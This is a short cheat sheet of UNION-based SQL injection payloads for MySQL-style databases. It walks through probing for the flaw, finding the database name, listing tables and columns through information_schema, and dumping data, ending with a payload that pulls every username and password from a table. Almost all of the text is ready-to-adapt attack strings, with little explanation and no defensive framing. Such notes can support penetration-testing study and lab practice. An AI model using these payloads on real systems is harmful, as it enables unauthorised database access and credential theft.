`UNION Injection` `Please REMOVE () Before Using the Commands`

`To find if SQLi Vulnarablity is Present`
```
0 UNION ALL SELECT 1,2,3,...; #               (Do This until you get a 200 service Result)
```
OR
```
' and 0=1 union select 1,2,3#
```
___
`To Find The Database Name`
```
0 UNION SELECT 1,2,...,database(); #
```
___
`Our next query will gather a list of tables that are in this database`
```
0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'DATABASE NAME'; #
```
___
`To find the 1st Column Name`
```
0 UNION ALL SELECT column_name,null,null,null,null... FROM information_schema.columns WHERE table_name="Give the Table Name here"; #
```
___
`To find all Column Names`
```
0 UNION ALL SELECT group_concat(column_name),null,null,null,null... FROM information_schema.columns WHERE table_name="Give the table name here"; #
```
___
`To Extract Data from SQL Database`
```
0 UNION ALL SELECT (Column name),null,null,null,null FROM (table name) WHERE (condition comes here if any, else skip WHERE); #
```
OR
```
0 UNION SELECT 1,2,...,group_concat(username,':',password SEPARATOR '<br>') FROM TABLENAME; #
```
___
